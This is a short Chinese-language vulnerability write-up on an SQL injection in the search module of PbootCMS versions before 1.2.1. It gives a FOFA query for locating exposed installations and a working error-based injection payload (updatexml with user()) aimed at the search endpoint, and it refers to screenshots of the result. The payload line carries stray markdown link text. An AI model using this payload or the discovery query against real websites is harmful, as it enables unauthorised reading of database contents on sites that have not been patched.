# PbootCMS  search SQL注入漏洞

## 漏洞描述

PbootCMS 搜索模块存在SQL注入漏洞。通过漏洞可获取数据库敏感信息

## 漏洞影响

> [!NOTE]
>
> PbootCMS < 1.2.1

## FOFA

> [!NOTE]
>
> app="PBOOTCMS"

## 漏洞复现

搜索框页面为

![image-20210702112736099](PbootCMS-search-SQL注入漏洞.assets/16273630362091122.jpg)

 Payload为

```
/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123)
```

![image-20210702112805069](PbootCMS-search-SQL注入漏洞.assets/1627363036586505.jpg)